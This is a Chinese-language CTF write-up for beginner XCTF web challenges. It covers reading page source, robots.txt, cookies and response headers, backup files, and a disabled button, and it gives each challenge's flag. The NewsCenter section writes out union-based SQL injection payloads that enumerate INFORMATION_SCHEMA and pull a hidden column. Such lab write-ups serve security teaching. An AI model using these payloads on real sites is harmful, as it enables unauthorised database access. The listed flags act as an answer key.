# Write-Up（Web部分）

## view_source

+ 打开网页，只看到一个大大的 “FLAG is not here” 的提示。
+ 题目的提示是 **查看源代码** ，因此直接在火狐浏览器中按下 **F12** ，即可看到源代码中有一行注释。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF（攻防世界）/WEB/view_source/1.png)

+ 注释中的内容就是flag。
+ flag: **cyberpeace{2d6b553891b29fd9ed11a89127bade69}**



## robots

+ 看到题目，直接想到可能与 **robots.txt** 有关。
+ 不了解 [**robots协议**](https://baike.baidu.com/item/robots%E5%8D%8F%E8%AE%AE/2483797?fr=aladdin) 的百度一下。
+ 在题目 **URL** 的后面加上 `/robots.txt` ，查看网站的 **robots.txt**：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/robots/1.png)

+ 发现 **robots.txt** 中禁止了 **f1ag_1s_h3re.php** 的显示：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/robots/1.png)

+ 直接在原 **URL** 后面加上 `/f1ag_1s_h3re.php` 。
+ f1ag_1s_h3re.php 页面中的内容就是 flag 。
+ flag: **cyberpeace{c1d5ab0f1dc36f04d10beed108ca8345}**



## cookie

+ 点开网页，发现一句话： “你知道什么是cookie吗？”。
+ 果断 **F12** ，然后在 **存储（storage）** 一栏看到 **cookie** ，数据内容里有一栏 **look-here: "cookie.php"**。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/cookie/1.png)

+ 于是在 **URL** 后面加上 `/cookie.php` ，发现跳转到另一个网页，网页上显示一句话： “See the http response”。
+ 于是再次 **F12** ，在 **网络（Network）** 一栏下方选择 **cookie.php** ，并观察右侧 **响应头** 的内容，看到一行 **flag: cyberpeace{e46eded4dad3ed1d66bf4cfdaf86c531}**

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/cookie/2.png)

+ flag: **cyberpeace{e46eded4dad3ed1d66bf4cfdaf86c531}**



## backup

+ 点开网页，发现一句话： “你知道index.php的备份文件名吗？”。
+ 实话说，真的不记得了QAQ...
+ 开始瞎猜，什么 **.bak** ，**.phpbak**，发现都不对。
+ 无奈之下百度，发现是 **.php~** 或者 **.php.bak** 。
+ 前者不对，后者输入 **URL** 地址栏后会提示下载一个 **bak文件** 。
+ 下载下来用 **notepad++** 打开，然后阅读代码发现其中有一段 **php** 代码里面有flag：

```php+HTML
<html>
<head>
    <meta charset="UTF-8">
    <title>备份文件</title>
    <link href="http://libs.baidu.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" />
    <style>
        body{
            margin-left:auto;
            margin-right:auto;
            margin-TOP:200PX;
            width:20em;
        }
    </style>
</head>
<body>
<h3>你知道index.php的备份文件名吗？</h3>
<?php
$flag="Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}"
?>
</body>
</html>

```

+ flag: **Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}**



## disabled_button

+ 打开网页发现一个灰色的不能按的按钮，上面写着 “flag”。
+ 为了让他能按，按 **F12** ，发现这个按钮的 HTML 是这么写的：

```html
<input class="btn btn-default" disabled="" class="btn btn-default" style="height:50px;width:200px;" type="submit" value="flag" name="auth">
```

+ 于是尝试在 `disabled=""` 里面加上 false 变成 `disabled="false"` ，但是按钮依然不能按。
+ 填进去各种值都不成功，索性删掉，于是就能点了...

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/disabled_button/1.png)

+ 点下去即显示出一行 flag 。
+ flag: **cyberpeace{bf48a972642983285b427ee951f8a1d9}**



## NewsCenter

+ 打开网页看到一个很朴素的页面，类似一个普通的新闻查询页面，页面正中间有一个搜索框：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/Hacker_News.png?raw=true)

+ 在搜索框中输入任意内容，例如输入 <code>1</code> 发现除了底下 **News** 部分显示出包含字段 <code>1</code> 的新闻以外，什么都没有发生，没有 **alert弹窗** 之类的。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/01.png?raw=true)

+ 猜测可能是 **SQL注入** ，首先尝试如下语句注入 `' and 1 = 1#` 什么都没发生...
+ 修改注入语句如下 `' and 1 = 2#` ，News部分变为空白，显然该 SQL 语句有效。

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/02.png?raw=true)

+ 利用union联合注入试探该sql查询返回的列数，首先尝试 1 列 `' and 1 = 2 union select 1#` ，页面跳转显示无法访问，说明不是 1 列。

+ `' and 1 = 2 union select 1, 2#` 同样失败。

+ `' and 1 = 2 union select 1, 2, 3#` 时，News部分出现内容

  > **2**
  >
  > 3

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)

+ 于是进一步查询数据库中所有的数据表名 `' and 1 = 2 union select 1, TABLE_SCHEMA, TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #` ，发现一个 **secret_table** 表：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/03.png?raw=true)

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/05.png?raw=true)

+ 查询 **secret_table** 表中的所有字段 `' and 1 = 2 union select 1, 2, COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME = 'secret_table' #` ，发现表中字段如下：

![](https://github.com/ThoseBygones/CTF_Write-Up/blob/master/XCTF%EF%BC%88%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%89/WEB/NewsCenter/06.png?raw=true)

+ **fl4g** 字段非常引人注目，猜测可能其中隐藏着 **flag**，因此进一步查询 **fl4g** 的内容 `' and 1 = 2 union select 1, 2, fl4g from secret_table #`
+ 成功得到 flag 。
+ flag: **QCTF{sq1_inJec7ion_ezzz}**

